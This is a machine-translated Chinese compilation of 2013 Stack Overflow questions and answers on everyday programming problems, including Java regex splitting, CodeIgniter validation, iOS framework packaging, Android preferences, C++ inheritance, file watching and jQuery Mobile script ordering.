                                   'min_length'  => "Please enter more then 2 char"
                                 ),

             'email'     => array( 'required'    => "Email is required",
                                   'valid_email' => "Please enter valid email"
                                 )
             ); 
```

4) 将验证规则和消息应用于库。

```
$this->jquery_validation->set_rules($rules);
$this->jquery_validation->set_messages($messages); 
```

5) 生成Javascript验证码。

```
// pass css selector for your form to run method

$validation_script = $this->jquery_validation->run('#registration_form');

// echo $validation_script in your <script> tag 
```

这是使用代码点火器验证定义添加 jquery 验证的方法。我的问题是获得一个验证库，该库使用此验证规则进行客户端和服务器端验证。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-08T13:31:43.983

jQuery 验证发生在客户端。

Codeigniter 验证发生在服务器上。

它们完全独立于彼此。如果您正确设置了规则，Codeigniter 验证甚至只会在 jQuery 验证由于某种原因没有发生的情况下才会发生。

# java - Java - 正则表达式拆分输入文本但保留分隔符

> ID：15879495
> 
> 赞同：0
> 
> 时间：2013-04-08T12:49:49.083
> 
> 标签：java, regex

寻找一些正则表达式帮助。我正在寻找一种 Java 中的方法来按单词拆分一些输入文本，但还要保留分隔符（空格、标点符号）。另一种说法是将单词拆分为它们自己的索引，而其他非单词字符可能位于数组的其他索引中。

此输入文本：

```
"Hello, this isn't working!" 
```

应该像这样放入一个数组中：

```
{"Hello", ",", "this", "isn't", "working", "!"} 
```

或者

```
{"Hello", ", ", "this", " ", "isn't", " ", "working", "!"} 
```

我在 Python 中使用它完成了基本相同的事情：

```
def split_input(string):
    return re.findall(r"[\w']+|[\s.,!?;:-]", string) 
```

但我还没有找到一种方法在 Java 中完成同样的事情。我尝试`String.split()`过前瞻/后视，也尝试过模式匹配器，但运气不佳。

任何帮助将非常感激！

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2013-04-08T12:57:47.207

`split`不是 Python 的 Java 类比`findall`。`Matcher.find`是。

```
Pattern stuff = Pattern.compile("[\\w']+|[\\s.,!?;:-]");
Matcher matcher = stuff.matcher("Hello, this isn't working!");
List<String> matchList = new ArrayList<String>();
while (matcher.find()) {
    matchList.add(matcher.group(0)); // add match to the list
} 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-04-08T13:09:44.630

试试这个：这正是你想要的。

```
public static void main(String[] args) {
    String str = "Hello, this isn't working!";
    String[] s = str.split("(?<=\\s+|,\\s)");
    System.out.println(Arrays.toString(s));
} 
```

输出：

```
[Hello, , this , isn't , working!] 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-04-08T13:00:04.077

所以，抛开你奇怪的例子不谈，这里有一些东西应该适合你的需要（还有待测试）：

```
"(?=[\\w']+|[\\s.,!?;:-])" 
```

对于第一个版本。

```
"(?=[\\w']+|[\\s.,!?;:-]+)" 
```

将多个分隔符保留为一个整体。

整个想法是，当您想要拆分但保留所有字符时，仅匹配位置。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2013-04-08T13:00:39.313

也许不是最好的方法，但你可以尝试：

```
string.replaceAll("([\\s.,!?;:-])", "$1\n");
string.split("\n"); 
```

# python - 从 MrJob 访问分布式缓存

> ID：15879498
> 
> 赞同：2
> 
> 时间：2013-04-08T12:49:54.000
> 
> 标签：python, hadoop, mrjob

我正在使用 MrJob 编写 hadoop 应用程序。我需要使用分布式缓存来访问一些文件。我知道 hadoop 流中有一个选项 -files 但不知道如何在程序中访问它。

谢谢你的帮助。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-06-07T07:45:25.157

我认为你必须使用

**mrjob.compat.supports_new_distributed_cache_options（版本）**

然后使用 -files 和 -archives 而不是 -cacheFile 和 -cacheArchive

也许你会[在这里得到更多](http://pythonhosted.org/mrjob/utils-compat.html?highlight=distributed%20cache#mrjob.compat.supports_new_distributed_cache_options)

* * *

## 回答 #2

> 赞同：-1
> 
> 时间：2013-04-08T13:18:13.743

您应该在程序中读取文件，就好像这些文件本身在其中一样可用，即该文件与正在运行的代码位于同一目录中的本地文件。

我不擅长 python，因此这里是 ruby​​ 中的示例，`mapper.rb`：

```
begin
    file = File.open("my-distributed-cache-file.txt")
    while (line = file.gets)
            # do something with your file
    end
    file.close
end
# Rest of mapper code 
```

# ios - 为 iOS 应用程序创建可分发的框架

> ID：15879506
> 
> 赞同：1
> 
> 时间：2013-04-08T12:50:10.297
> 
> 标签：ios, xcode, static-libraries

我目前正在构建一个库，它应该在一些 iOS 项目内部使用，但也应该分发给使用该库访问我们服务的客户。库本身完全由 C++ 代码组成，我基本上可以在 iOS 上使用它创建运行良好的应用程序。我的问题是创建一个单一的、易于分发的文件，该文件可以分发给客户，客户可以轻松安装它们，使用提供的标头，并且在链接时不需要遇到我目前面临的头痛问题。

我们的代码依赖于另外两个项目，即 boost 和 websocketpp。[为了提升，github](https://gitorious.org/~galbraithjoseph/boostoniphone/galbraithjosephs-boostoniphone)上有我用来生成框架的脚本。对于 websocketpp，我将其导入 XCode 并使用[此 github 项目](https://github.com/jverkoey/iOS-Framework)中的脚本来构建框架。我将这两个框架作为依赖项添加到我的（潜在）框架中，并使用相同的脚本来构建一个。

我有一个应用程序使用我的库作为子项目工作正常。即使将框架包含在项目中并在设备上运行它也可以正常工作。到目前为止，一切都很好。

但是，尝试创建 App 项目的存档会导致一些问题和头痛。

1.  我的库似乎没有包含所有架构的代码。所以我尝试归档框架项目，在构建脚本中进行小的修改以使用不同的位置来搜索标题之后工作正常。

2.  它似乎不包含所有二进制代码或对本地文件的引用（即我的 boost 的特定位置）。我从 Linker 错误中收集到，我仍然得到它告诉我一些 boost 调用无法满足。

第二个问题让我认为我一定是在做一些根本错误的事情，我的直觉告诉我，为其他人创建 iOS 开发框架或库并不是那么困难和“骇人听闻”。

正如您现在可能已经发现的那样，我在 iOS 方面不是很有经验，我想知道我是否从根本上错过了一些东西。所以，我确信这个问题相当广泛，所以有一些更具体的问题：

1.  是否有（另一种）方法来生成某种可分发的（最好是框架），其中包含：我的公共标头、为支持 iOS 开发的所有平台编译的二进制代码、依赖项的二进制代码？
    *   通过在构建过程中添加一些手写脚本来做到这一点的唯一方法是什么？
    *   我觉得我发现的信息已经过时了，因为它已经超过一年了，而且主要是指 Xcode 4.2 或 4.3——那么最近这方面有什么变化吗？
2.  例如，我得到的一个错误是：

    ```
    File is universal (2 slices) but does not contain a(n) armv7s slice: <file> 
    ```

    `<file>`切片是不同 XCode 工作区文件夹中框架中文件的路径（`Products`库是在不同的工作区中构建的，然后是应用程序）。我从一个完全不同的位置将框架文件夹放入该测试的项目中。

    *   这里发生了什么？
    *   为什么它一直引用一些内部 XCode 目录？
    *   如何正确导出？
3.  因为我猜我的设置可能与我迄今为止尝试的所有不同的事情都扭曲和奇怪：在理想情况下，这个设置看起来如何？
4.  是的，已经有一些关于这个的问题，但是，我在这些回复中看不到或不理解：
    *   ...如何正确处理我的代码与其他第三方代码的依赖关系。
    *   ...如何生成可分发的文件。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-30T16:14:42.913

您是否在编译源和复制文件下检查了您的项目构建阶段，以查看您的构建中是否包含框架源文件？

你也可以试试 OSX -> Framework & Library 下的 C/C++ Library 模板。

最后，还有[kstenerud 的 iOS 通用框架](https://github.com/kstenerud/iOS-Universal-Framework)，我发现它非常有用。我在[博客](http://rayvinly.com/how-to-build-a-truly-universal-framework-for-ios-and-mac-with-just-a-single-codebase/)中写了几篇关于使用它的文章。

# javascript - API explorer/playground/sandbox 用于用 Javascript 编写的自定义 API

> ID：15879513
> 
> 赞同：0
> 
> 时间：2013-04-08T12:50:27.327
> 
> 标签：javascript, api, custom-application

我们想要一个用 Javascript 编写的简单 API 浏览器来测试我们为 iOS 应用程序构建的自定义 REST API。API 发送 GET 和 POST 请求（POST 请求使用 multipart/formdata 编码发送）并返回 JSON。

我发现：

*   apigee.com 资源管理器（这是一个托管解决方案，配置相当复杂）
*   用 Node.JS 编写的 mashery iodocs
*   Django API 游乐场 - 需要服务器端的东西

据我所知，这应该是一个纯粹的客户端应用程序——只是形成请求、接收响应和显示。肯定有人已经写过这样的东西了吧？！

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-08T13:33:20.130

听起来您正在寻找[Swagger UI](https://github.com/swagger-api/swagger-ui/)。演示： http: [//petstore.swagger.io](http://petstore.swagger.io)

# android - android INSTALL_FAILED_MISSING_SHARED_LIBRARY

> ID：15879514
> 
> 赞同：5
> 
> 时间：2013-04-08T12:50:28.057
> 
> 标签：android, eclipse, android-widget, snmp

这个问题来自使用 Android 3.1 的 snmp4android.jar

```
[2013-04-08 14:42:25 - ControlloGiardinoWG] Installation error: INSTALL_FAILED_MISSING_SHARED_LIBRARY
[2013-04-08 14:42:25 - ControlloGiardinoWG] Please check logcat output for more details.
[2013-04-08 14:42:25 - ControlloGiardinoWG] Launch canceled! 
```

在登录：

```
package ..... requires unavaiable shared library org.snmp4j.CommunityTarget; failing! 
```

但是在构建路径上添加了包，尝试添加库，尝试添加资产，尝试在每次尝试时清理和构建项目......

在清单上我已经声明了所有使用的库：

```
 <uses-library android:name="org.snmp4j.CommunityTarget"/>
        <uses-library android:name="org.snmp4j.PDU"/>
        <uses-library android:name="org.snmp4j.Snmp"/>
        <uses-library android:name="org.snmp4j.TransportMapping"/>
        <uses-library android:name="org.snmp4j.event.ResponseEvent"/>
        <uses-library android:name="org.snmp4j.event.ResponseListener"/>
        <uses-library android:name="org.snmp4j.mp.SnmpConstants"/>
        <uses-library android:name="org.snmp4j.smi.Address"/>
        <uses-library android:name="org.snmp4j.smi.GenericAddress"/>
        <uses-library android:name="org.snmp4j.smi.Integer32"/>
        <uses-library android:name="org.snmp4j.smi.OID"/>
        <uses-library android:name="org.snmp4j.smi.OctetString"/>
        <uses-library android:name="org.snmp4j.smi.UdpAddress"/>
        <uses-library android:name="org.snmp4j.smi.VariableBinding"/>
        <uses-library android:name="org.snmp4j.transport.DefaultUdpTransportMapping"/> 
```

试图删除并重新安装 sdk ...问题可能出在哪里？

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2013-04-12T10:47:07.980

解决了......问题出现了，因为对于外部jar，它不需要在清单上声明库......在清单上删除帖子上写的内容可以解决问题......

# cordova - Tabbar 使我的视图可以水平滚动

> ID：15879525
> 
> 赞同：0
> 
> 时间：2013-04-08T12:50:53.393
> 
> 标签：cordova, dojo, tabbar, scrollable

当我插入`tabbar`底部导航时，我可以水平滚动整个视图。我尝试了`scrollDir`命令，`scrollableview`但这不起作用。我不希望视图可以水平滚动。

# c++ - 基派生类关系

> ID：15879533
> 
> 赞同：4
> 
> 时间：2013-04-08T12:51:12.667
> 
> 标签：c++, inheritance

我对基派生类关系有这个疑问。

我知道当我们从基类派生一个类时，派生类将拥有有关基类的所有信息。但是基类对派生类一无所知。

那么，为什么这是可以接受的？

```
Base *b=new Derived(); 
```

并不是

```
Derived *d=new Base();. 
```

基本上我需要了解第一个陈述的需要？我的意思是，将派生类对象分配给基类指针有什么用？

注意：这不是作业。我在学习编程的早期阶段。所以基本上需要了解点点滴滴。如果这是非常基本的并且已经被问到的问题，请忽略。

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2013-04-08T13:04:12.357

当`Derived`创建类对象时，`Base`首先调用类构造函数。类`Derived`对象包含`Base`类对象。这允许它调用它的`Base`函数。而`Base`类对象不包含`Derived`类对象

![在此处输入图像描述](https://i.stack.imgur.com/TgLKi.png)

```
Base *b=new Derived(); 
```

在可以使用单个函数处理所有派生类对象的情况下很有用。

考虑，

父类：动物派生类：狗、猫等

现在，你有一个功能

`void doSomethingtoTheAnimal(//take Animal here);`

如果不允许将基类对象分配给父引用变量。您将不得不为 等创建一个单独的`Dog`函数`Cat`。

```
void doSomethingtoTheAnimal(Cat *b) or void doSomethingtoTheAnimal(Dog *b) 
```

但是，您可以使用多态性`void doSomethingtoTheAnimal(Base *b);`然后您可以

`Base *b1 = new Dog()`或者`Base *b2 = new Cat();`

并使用相同的功能`doSomethingtoTheAnimal(b1)`或`doSomethingtoTheAnimal(b2)`

此外，指向派生类对象时的基类指针只能调用父类中的函数或子类中的覆盖函数。它不知道专门在子类中定义的函数

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2013-04-08T12:59:15.587

您已经回答了自己的问题，但我认为令您困惑的是指针

```
Derived *d=new Base(); 
```

> 派生类将拥有有关基类的所有信息。但是基类对派生类一无所知。

是的，所以你期待，因为这是声明为派生的`Derived *d`，它应该知道关于基础的一切。但重要的是实际创造了什么。在这种情况下，您创建了 Base`new Base();`并且`Derived`可以添加更多内容`Base`，因此我们不能将 Base 用作 Derived。

然而在这种情况下

```
Base *b=new Derived(); 
```

创建一个新的派生。但我们只对它从 Base 继承的内容感兴趣。没关系。

> 因为 Derived 知道 base 中的内容

.

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2013-04-08T12:58:14.783

继承定义了“is-a”关系。如果`Derived`has`Base`作为基类，则`Derived`is-a `Base`。

换句话说：每个`Derived`对象都可以被视为一个`Base`，这使得它有效：

```
Base* b = new Derived(); 
```

取消引用`b`允许访问实例的`Base`各个部分。`Derived`

这反过来不起作用，因为 a`Base`不是 a `Derived`。以下内容无效：

```
Derived* d = new Base(); // NOT VALID 
```

# javascript - socket.io 和 socket.io-client 有什么区别？

> ID：15879536
> 
> 赞同：1
> 
> 时间：2013-04-08T12:51:19.300
> 
> 标签：javascript, node.js, socket.io

[socket.io](https://github.com/LearnBoost/socket.io)和[socket.io-client](https://github.com/LearnBoost/socket.io-client)有什么区别？

我正在尝试使用的一些项目正在使用 socket.io-client，但我习惯于使用普通的旧 socket.io，它并没有真正在文档中列出。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-06-30T21:35:24.303

我知道的主要区别是，使用[socket.io-client](https://github.com/LearnBoost/socket.io-client)库，您可以将您的服务器连接到另一个服务 socket.io 事件的服务器。

例如，如果我的服务器`http://localhost`正在发出一个`data`事件，我可以像这样在另一台服务器上监听：

```
var socket = require('socket.io')('http://localhost');
  socket.on('connect', function(){
    socket.on('data', function(data){
      // Do something with data
    });
  }); 
```

并相应地响应传递的数据对象。

# java - 识别新创建的文件并处理它们

> ID：15879547
> 
> 赞同：0
> 
> 时间：2013-04-08T12:51:55.570
> 
> 标签：java

基本上我必须监视文件夹中新创建的文件。

在我的项目中，我们有一个每 10 分钟运行一次的调度程序，现在我们要做的是读取所有文件名并检查数据库是否已处理，如果未处理，则在数据库中输入并处理它。

我用谷歌搜索了它，发现很少有解决方案涉及像 JNotify ， FileAlterationObserver 类以及 FileAlterationMonitor 这样的路径的listner，但是我必须监视大约20个文件夹，所以我正在寻找任何更简单的解决方案，例如每当我读取文件时将其标记为已处理（重命名它并将“已*处理*”附加到其名称或任何唯一文本中）并下次读取未标记为“已*处理*”的文件。

使用这种方法，我将不得不从文件夹中读取所有文件并检查每个文件名是否以“已*处理*”结尾。

我是jave的新手，所以我不知道这是否可能，所以我的问题是，我可以在不遍历文件夹中存在的所有文件名的情况下查询所有不以“已*处理”结尾的文件名吗？*

或者有人有其他解决方案吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-08T13:31:32.190

处理完成后，我们还需要该文件吗？谁在修改文件？如果是通过程序，该程序是否需要有关已处理文件的信息？当该程序要修改文件时，将再次将其从**file1_processed**重命名为**file1**？
如果您更改文件名，您必须考虑这些用例以及更多（虽然我不了解您的系统，但我觉得它会完成）。
最好只有我们`JNotifier`，使用起来非常简单。使用它，您实际上可以删除调度程序。每当通知针对特定文件（添加/修改等）时，您实际上可以仅针对特定文件更新数据库，无需遍历文件夹。
只需确保在少数情况下您可以收到多个通知`JNotifier`，例如，当添加新文件时，您会被添加、修改，重命名时您会被重命名、修改。所以这些事情你要小心。
使用旧的调度程序，您也可以这样做。您可以将文件的最后更新时间戳保存在数据库中。在下一个计划中，您只需检查最新的时间戳，如果时间戳较新，则处理它并重新更新数据库。
您也可以混合使用`JNotify`调度程序。通过 jnotify 更新 some 中更改/修改的文件名`ADT`，调度程序可以在 ADT 中搜索，获取修改后的文件路径并仅在数据库中更新这些文件。

您可以从以下示例中获得帮助，

```
public void register(String path) throws JNotifyException {
        int mask = JNotify.FILE_CREATED | JNotify.FILE_DELETED
                | JNotify.FILE_MODIFIED | JNotify.FILE_RENAMED;
        boolean watchSubtree = true;
        if (pathSet.contains(path)) {
            return;
        }
        System.out.println("Adding watch for: " + path);
        JNotify.addWatch(path, mask, watchSubtree,
                new JNotifyListener() {

                    @Override
                    public void fileCreated(int arg0, String folderName, String fileName) {
                        fileChanged("New object created: " + fileName + " in folder: " + folderName);

                    }

                    @Override
                    public void fileDeleted(int arg0, String folderName, String fileName) {
                        fileChanged(fileName + " deleted in folder: " + folderName);
                    }

                    @Override
                    public void fileModified(int arg0, String folderName, String fileName) {
//                      fileChanged(fileName + " modified in folder: " + folderName);
                    }

                    @Override
                    public void fileRenamed(int arg0, String folderName, String oldFileName,
                            String newFileName) {
                        fileChanged(oldFileName + " renamed to: "+ oldFileName +" in folder: " + folderName);
                    }
                });
    }

    private void fileChanged(String str){
        //your code here
    } 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-08T13:00:56.307

如果您可以更改文件名，那么您可以将文件重命名为“old_file_name + Processed”，然后只处理那些名称不以已处理结束的文件。

# ios - 将视图控制器添加到我的视图并编程冻结。目标-c

> ID：15879549
> 
> 赞同：-1
> 
> 时间：2013-04-08T12:51:57.727
> 
> 标签：ios, objective-c, ipad, uiviewcontroller

我在顶部有一个带有几个按钮的菜单，当一个人选择不同的按钮时，视图会切换到不同的视图控制器。可以使用 xib 文件，也可以自己编程接口。

```
ViewController *viewController = [[ViewController alloc] initWithNibName:ViewController bundle:nil];

[self.view addSubview:ViewController.view]; 
```

使用异常断点，程序会在第一行暂停，然后当我继续运行它时，它会冻结并且不会在控制台中给出错误消息。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-04-08T12:55:12.167

看起来您的 nibName 周围缺少引号：

```
ViewController *ViewController = [[ViewController alloc] initWithNibName:@"ViewController" bundle:nil]; 
```

# android - 在android中显示和隐藏首选项

> ID：15879550
> 
> 赞同：0
> 
> 时间：2013-04-08T12:52:01.570
> 
> 标签：android, android-preferences

我有一个preference.xml 文件，我想显示或隐藏这个文件的一些条目。但问题是偏好没有被隐藏。我的代码如下：

```
 @Override
    public void onCreate(Bundle savedInstanceState) {
        // TODO Auto-generated method stub
        super.onCreate(savedInstanceState);

        addPreferencesFromResource(R.xml.preferences);

        Preference customPref = (Preference) findPreference(getText(R.string.about));
        customPref.setOnPreferenceClickListener(this);
        Preference termAndConditions = (Preference) findPreference(getText(R.string.term_and_conditions));
        termAndConditions.setOnPreferenceClickListener(this);
        Preference privacyStatement = (Preference) findPreference(getText(R.string.privacy_statement));
        privacyStatement.setOnPreferenceClickListener(this);
        Preference login_with_facebook = (Preference) findPreference(getText(R.string.login_with_facebook));
        login_with_facebook.setOnPreferenceClickListener(this);
        Preference register_new_account = (Preference) findPreference(getText(R.string.register_new_account));
        register_new_account.setOnPreferenceClickListener(this);
        Preference login = (Preference) findPreference(getText(R.string.login));
        login.setOnPreferenceClickListener(this);
        Preference my = (Preference) findPreference(getText(R.string.my));
        my.setOnPreferenceClickListener(this);
        Preference miles_and_more = (Preference) findPreference(getText(R.string.miles_and_more));
        miles_and_more.setOnPreferenceClickListener(this);
        Preference voucher_booking = (Preference) findPreference(getText(R.string.voucher_booking));
        voucher_booking.setOnPreferenceClickListener(this);
        Preference invite_friends = (Preference) findPreference(getText(R.string.invite_friends));
        invite_friends.setOnPreferenceClickListener(this);
    }
onResume{
buildLogin()
}

private void buildLogin() {
        PreferenceScreen preferenceScreen = getPreferenceScreen();
        hidePreferences(preferenceScreen, R.string.my);
        hidePreferences(preferenceScreen, R.string.miles_and_more);
        hidePreferences(preferenceScreen, R.string.voucher_booking);
        hidePreferences(preferenceScreen, R.string.invite_friends);
    }
private void hidePreferences(PreferenceScreen preferenceScreen,
            int preferenceKey) {
        Preference customPref = (Preference) findPreference(getText(preferenceKey));
        preferenceScreen.removePreference(customPref);
    } 
```

这个想法是隐藏 onResume() 上的一些偏好。这个类是从 PreferenceFragment 扩展而来的。有人可以指出我做错了什么。没有任何偏好是隐藏的。

# php - 防止我的网站不断重新访问

> ID：15879553
> 
> 赞同：-1
> 
> 时间：2013-04-08T12:52:11.310
> 
> 标签：php, web

[我自己的路](http://xyz.in/node/58)

几周前，我从生产环境中删除了我的应用程序（代码），就在今天，我开发了一个新站点并将其移至生产环境。

在站点统计表中，我注意到有人每 10 分钟点击一次上述路径，我知道他们是黑客，现在我想从自动化机器数据库中删除我的路径，因为由于这些自动化机器人攻击我的服务器带宽急剧增加。

如何保护站点免受自动化机器的侵害？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-08T13:23:06.117

检查垃圾邮件发送者黑名单的用户 ip。使用 stopforumspam.com 的 api 等网站。让我给你示例代码

```
function check_user($ip){
$var_url = "http://www.stopforumspam.com/api?f=json&ip=".$ip; 
$get = file_get_contents($var_url);
$me = json_decode($get,true);
$result = $me['ip']['appears'];
if($result==0){
$isspamer = 0;
}
else{$isspamer = 1;
}
return $isspamer;
} 
```

并调用函数

```
if(check_user($_SERVER['REMOTE_ADDR']))die('you are a spammer access denied'); 
```

# javascript - jquery mobile转义页面的一部分 （动态创建）

> ID：15879556
> 
> 赞同：1
> 
> 时间：2013-04-08T12:52:23.423
> 
> 标签：javascript, jquery-mobile, jquery, markup

一直试图从 jquery mobile 转义页面的一部分，因为我已经有一个不同的插件处理页面 turn.js 的该部分，但我似乎无法逃脱它......这是在另一个处理的动态 div 上jQuery插件。这是一个小提琴： http: [//jsfiddle.net/adamsurfari/DpQQV/](http://jsfiddle.net/adamsurfari/DpQQV/)这就是翻书应该如何工作[http://jsfiddle.net/blasten/A9a7E/](http://jsfiddle.net/blasten/A9a7E/)

我已经在使用

```
<div data-enhance="false" data-role="none" id="flipbook">
</div> 
```

但图像仍然没有出现。是否有不同的方式来逃避 div 以及 jquery mobile 中的内容？

页面配置：

```
<title></title>
    <script src="http://code.jquery.com/jquery-1.9.1.min.js"></script>

    <script type="text/javascript" src="zip/zip.js"></script>
    <script type="text/javascript" src="zip/deflate.js"></script>
    <script type="text/javascript" src="zip/zip-ext.js"></script>

    <link rel="stylesheet" href="http://code.jquery.com/mobile/1.3.0/jquery.mobile-1.3.0.min.css" />
    <script src="http://code.jquery.com/jquery-1.8.2.min.js"></script>
    <script src="http://code.jquery.com/mobile/1.3.0/jquery.mobile-1.3.0.min.js"></script>

    <script>
        $(document).on('mobileinit', function () {
            $.mobile.ignoreContentEnabled = true;
        });
    </script>

    <script type="text/javascript" src="turn.js"></script> 
```

这是 turn.js 的正常输出：

```
<div data-enhance="false" id="flipbook"
     style="position: relative; width: 1024px; height: 360px; -webkit-transform: translate3d(0px, 0px, 0px);">
    <div class="turn-page-wrapper" page="1"
         style="position: absolute; overflow: hidden; width: 512px; height: 360px; top: 0px; right: 0px; left: auto; bottom: auto; z-index: 56;">
        <div style="position: absolute; top: 0px; left: 0px; overflow: hidden; z-index: auto; width: 626px; height: 626px; -webkit-transform-origin: 0% 100%;">
            <div data-enhance="false" class="turn-page p1"
                 style="width: 512px; height: 360px; position: absolute; top: 0px; left: 0px; bottom: auto; right: auto; -webkit-transform-origin: 0% 100%;">
                <img width="512px" src="filesystem:http://localhost:8080/persistent/LEGO/CATALOGO%202013_001.jpg"></div>
        </div>
        <div style="top: 0px; left: 0px; overflow: hidden; z-index: 1; width: 512px; height: 360px; background-image: -webkit-gradient(linear, 100% 100%, 100% 100%, color-stop(0.8, rgba(0, 0, 0, 0)), to(rgba(0, 0, 0, 0.298039)), to(rgba(0, 0, 0, 0))); display: none;"></div>
    </div>
    <div style="pointer-events: none; position: absolute; top: -50px; left: -8px; overflow: visible; z-index: auto; display: none;">
        <div style="position: absolute; top: 50px; left: 520px; overflow: hidden; z-index: 56; width: 626px; height: 626px; -webkit-transform-origin: 0% 100%; -webkit-transform: translate3d(512px, -266px, 0px) rotate(-90deg); display: none;">
            <div style="position: absolute; top: auto; left: 0px; overflow: visible; z-index: auto; width: 512px; height: 360px; right: auto; bottom: 0px; -webkit-transform-origin: 0% 100%; -webkit-transform: rotate(90deg) translate3d(0px, 360px, 0px);">
                <div style="cursor: default; width: 360px; height: 512px; -webkit-transform-origin: 0% 0%; -webkit-transform: rotate(-90deg);">
                    <div data-enhance="false" class="turn-page p2"
                         style="width: 512px; height: 360px; -webkit-transform-origin: 0% 0%;">
                        <div class="turn-page p4" style="width: 200px; height: 300px;"> Page 2</div>
                    </div>
                    <div style="position: absolute; top: 0px; left: 0px; overflow: hidden; z-index: 1; width: 360px; height: 512px; background-image: -webkit-gradient(linear, 0% 0%, 0% 0%, from(rgba(0, 0, 0, 0)), color-stop(0.8, rgba(0, 0, 0, 0.2)), to(rgba(255, 255, 255, 0.2)));"></div>
                </div>
            </div>
        </div>
    </div>
    <div class="turn-page-wrapper" page="2"
         style="position: absolute; overflow: hidden; width: 512px; height: 360px; top: 0px; left: 0px; right: auto; bottom: auto; z-index: 0; display: none;"></div>
    <div class="turn-page-wrapper" page="3"
         style="position: absolute; overflow: hidden; width: 512px; height: 360px; top: 0px; right: 0px; left: auto; bottom: auto; z-index: 55;">
        <div data-enhance="false" class="turn-page p3" style="width: 512px; height: 360px;">
            <div class="turn-page p4" style="width: 200px; height: 300px;"> Page 3</div>
        </div>
    </div> 
```

这是带有 data-enhanced="false" 的 jquerymobile 的输出，jquerymobile 仍然与 data-enhanced="false" DIV 中的代码混淆：

```
<div data-enhance="false" id="flipbook"
     style="position: relative; width: 400px; height: 300px; -webkit-transform: translate3d(0px, 0px, 0px);">
    <div class="turn-page-wrapper ui-page ui-body-c" tabindex="0"
         style="position: absolute; overflow: hidden; width: 200px; height: 300px; top: 0px; right: 0px; left: auto; bottom: auto; z-index: 8;">
        <div style="position: absolute; top: 0px; left: 0px; overflow: hidden; z-index: auto; width: 361px; height: 361px; -webkit-transform-origin: 0% 100%;">
            <div class="hard turn-page p1"
                 style="width: 200px; height: 300px; position: absolute; top: 0px; left: 0px; bottom: auto; right: auto; -webkit-transform-origin: 0% 100%;">
                Turn.js
            </div>
        </div>
        <div style="top: 0px; left: 0px; overflow: hidden; z-index: 1; width: 200px; height: 300px; background-image: -webkit-gradient(linear, 100% 100%, 100% 100%, color-stop(0.8, rgba(0, 0, 0, 0)), to(rgba(0, 0, 0, 0.298039)), to(rgba(0, 0, 0, 0))); display: none;"></div>
    </div>
    <div style="pointer-events: none; display: none; position: absolute; top: -193.1875px; left: -15px; overflow: visible; z-index: auto;">
        <div style="position: absolute; top: 193.1875px; left: 215px; overflow: hidden; z-index: 8; display: none; width: 361px; height: 361px; -webkit-transform-origin: 0% 100%; -webkit-transform: translate3d(200px, -61px, 0px) rotate(-90deg);">
            <div style="position: absolute; top: auto; left: 0px; overflow: visible; z-index: auto; width: 200px; height: 300px; right: auto; bottom: 0px; -webkit-transform-origin: 0% 100%; -webkit-transform: rotate(90deg) translate3d(0px, 300px, 0px);">
                <div style="cursor: default; width: 300px; height: 200px; -webkit-transform-origin: 0% 0%; -webkit-transform: rotate(-90deg);">
                    <div style="position: absolute; top: 0px; left: 0px; overflow: hidden; z-index: 1; width: 300px; height: 200px; background-image: -webkit-gradient(linear, 0% 0%, 0% 0%, from(rgba(0, 0, 0, 0)), color-stop(0.8, rgba(0, 0, 0, 0.2)), to(rgba(255, 255, 255, 0.2)));"></div>
                </div>
            </div>
        </div>
    </div>
    <div class="turn-page-wrapper ui-page ui-body-c" tabindex="0"
         style="position: absolute; overflow: hidden; width: 200px; height: 300px; top: 0px; left: 0px; right: auto; bottom: auto; z-index: 0; display: none;">
        <div class="hard turn-page p2" style="width: 200px; height: 300px; -webkit-transform-origin: 0% 0%;"></div>
    </div>
    <div class="turn-page-wrapper ui-page ui-body-c" tabindex="0"
         style="position: absolute; overflow: hidden; width: 200px; height: 300px; top: 0px; right: 0px; left: auto; bottom: auto; z-index: 7;">
        <div id="page1-test" class="turn-page p3" style="width: 200px; height: 300px;"> Page 1 <a href="#"
                                                                                                  data-role="button"
                                                                                                  id="test-button">Dynamic
            Button</a></div>
    </div>
    <div class="turn-page-wrapper ui-page ui-body-c" tabindex="0"
         style="position: absolute; overflow: hidden; width: 200px; height: 300px; top: 0px; left: 0px; right: auto; bottom: auto; z-index: 0; display: none;">
        <div class="turn-page p4" style="width: 200px; height: 300px;"> Page 2</div>
    </div>
    <div class="turn-page-wrapper ui-page ui-body-c" tabindex="0"
         style="position: absolute; overflow: hidden; width: 200px; height: 300px; top: 0px; right: 0px; left: auto; bottom: auto; z-index: 0; display: none;">
        <div class="turn-page p5" style="width: 200px; height: 300px;"> Page 3</div>
    </div> 
```

可以看到 jqueryMobile 仍然与 div 内的代码混淆：

例如：

```
<div class="turn-page-wrapper" page="1" 
```

转化为：

```
<div class="turn-page-wrapper ui-page ui-body-c" tabindex="0" 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-04-08T13:19:49.433

# 使固定：

改变这个：

```
 <script src="http://code.jquery.com/jquery-1.8.2.min.js"></script>
    <script src="http://code.jquery.com/mobile/1.3.0/jquery.mobile-1.3.0.min.js"></script>

    <script>
        $(document).on('mobileinit', function () {
            $.mobile.ignoreContentEnabled = true;
        });
    </script>

    <script type="text/javascript" src="turn.js"></script> 
```

对此：

```
 <script src="http://code.jquery.com/jquery-1.8.2.min.js"></script>
    <script>
        $(document).on('mobileinit', function () {
            $.mobile.ignoreContentEnabled = true;
        });
    </script>
    <script src="http://code.jquery.com/mobile/1.3.0/jquery.mobile-1.3.0.min.js"></script>    
    <script type="text/javascript" src="turn.js"></script> 
```

